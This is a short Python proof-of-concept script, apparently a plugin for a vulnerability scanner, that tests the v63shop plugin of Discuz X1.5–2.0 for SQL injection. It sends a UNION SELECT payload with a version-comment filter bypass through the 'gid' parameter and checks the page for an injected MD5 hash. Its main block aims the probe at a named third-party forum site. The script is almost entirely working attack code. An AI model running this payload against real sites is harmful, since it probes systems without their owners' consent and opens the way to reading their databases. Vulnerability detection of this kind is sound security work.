#!/usr/bin/env python
#For Discuz X1.5-2.0
import re

from time import clock

def assign(service, arg):
    if service == "discuz":
        return True, arg

def audit(arg):
    url = arg + "plugin.php?id=v63shop:goods&pac=info&gid=1 and 1=2 union /*!50000select*/ 1,2,3,4,5,6,md5(3.14),8,9,10,11,12,13,14"
    start = clock()
    code, head, body, _, _ = curl.curl('"%s"' % url)
    if code == 200:
        if body and body.find('4beed3b9c4a886067de0e3a094246f78') != -1:
            security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('discuz', 'http://bbs.6tennis.com/')[1])
